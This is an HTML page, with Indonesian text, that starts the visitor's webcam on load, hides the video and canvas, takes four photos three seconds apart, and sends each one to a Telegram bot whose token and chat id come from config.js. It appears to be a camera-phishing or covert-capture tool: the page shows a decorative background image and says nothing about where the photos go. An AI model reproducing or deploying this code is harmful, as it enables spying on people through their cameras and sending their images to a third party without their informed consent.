<!DOCTYPE html>
<html>
<head>
    <title>Pengambilan Gambar Otomatis (4 Kali)</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-image: url('assets/NAMA_FILE_FOTO_ANDA.jpg'); /* Ganti dengan nama file foto Anda */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: sans-serif;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
        }

        #videoElement, #canvasElement {
            display: none;
        }

        #status {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
    </style>
    <script src="config.js"></script>
</head>
<body>
    <div id="status">Memulai kamera...</div>

    <script>
        const videoElement = document.createElement('video');
        const canvasElement = document.createElement('canvas');
        const context = canvasElement.getContext('2d');
        const statusDiv = document.getElementById('status');
        const captureCount = 4; // Jumlah pengambilan gambar
        const intervalTime = 3000; // Interval waktu antar pengambilan (3 detik)
        let imagesSent = 0;
        let captureInterval;

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                videoElement.srcObject = stream;
                videoElement.onloadedmetadata = () => {
                    statusDiv.innerText = `Kamera aktif, akan mengambil ${captureCount} gambar setiap ${intervalTime / 1000} detik.`;
                    startCaptureInterval();
                };
            } catch (error) {
                console.error('Gagal mengakses kamera:', error);
                statusDiv.innerText = 'Gagal mengakses kamera.';
            }
        }

        function startCaptureInterval() {
            captureInterval = setInterval(() => {
                if (imagesSent < captureCount) {
                    captureAndSendImage();
                } else {
                    clearInterval(captureInterval);
                    statusDiv.innerText = 'Semua gambar telah dikirim.';
                }
            }, intervalTime);
        }

        function captureAndSendImage() {
            statusDiv.innerText = `Mengambil gambar ke-${imagesSent + 1}...`;
            if (!videoElement.videoWidth || !videoElement.videoHeight) {
                console.warn('Ukuran video belum tersedia.');
                return;
            }
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
            const imageDataURL = canvasElement.toDataURL('image/jpeg');
            sendImageToTelegram(imageDataURL);
        }

        async function sendImageToTelegram(imageDataURL) {
            statusDiv.innerText = `Mengirim gambar ke-${imagesSent + 1}...`;
            const formData = new FormData();
            formData.append('chat_id', telegramConfig.chatId);
            formData.append('photo', dataURLtoBlob(imageDataURL), `captured_image_${imagesSent + 1}.jpg`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();
                if (data.ok) {
                    statusDiv.innerText = `Gambar ke-${imagesSent + 1} berhasil dikirim ke Telegram!`;
                    console.log(`Gambar ke-${imagesSent + 1} berhasil dikirim:`, new Date());
                    imagesSent++;
                } else {
                    console.error('Gagal mengirim gambar ke Telegram:', data);
                    statusDiv.innerText = `Gagal mengirim gambar ke-${imagesSent + 1} ke Telegram.`;
                    clearInterval(captureInterval); // Hentikan jika ada kegagalan
                }
            } catch (error) {
                console.error('Terjadi kesalahan saat mengirim gambar:', error);
                statusDiv.innerText = `Terjadi kesalahan saat mengirim gambar ke-${imagesSent + 1}.`;
                clearInterval(captureInterval); // Hentikan jika ada kesalahan
            }
        }

        function dataURLtoBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        // Buat elemen video dan canvas secara programatik dan sembunyikan
        videoElement.id = 'videoElement';
        canvasElement.id = 'canvasElement';
        document.body.appendChild(videoElement);
        document.body.appendChild(canvasElement);
        videoElement.style.display = 'none';
        canvasElement.style.display = 'none';

        // Otomatis memulai kamera saat halaman dimuat
        startCamera();
    </script>
</body>
</html>
